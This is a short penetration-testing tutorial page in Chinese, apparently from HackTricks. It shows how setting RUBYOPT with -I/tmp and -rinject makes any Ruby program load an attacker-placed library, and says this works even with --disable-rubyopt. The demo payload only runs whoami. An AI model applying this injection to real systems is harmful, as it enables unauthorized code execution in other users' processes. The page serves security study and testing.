# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

使用此环境变量，可以在 **ruby** 每次执行时**添加新参数**。虽然不能使用参数 **`-e`** 来指定要执行的 ruby 代码，但可以使用参数 **`-I`** 和 **`-r`** 将新文件夹添加到要加载的 libraries 路径中，然后**指定要加载的 library**。

在 **`/tmp`** 中创建 library **`inject.rb`**：
```ruby:inject.rb
puts `whoami`
```
在任意位置创建一个类似这样的 Ruby 脚本：
```ruby:hello.rb
puts 'Hello, World!'
```
然后让任意 Ruby 脚本加载它：
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
有趣的是，即使使用参数 **`--disable-rubyopt`**，它也能正常工作：
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
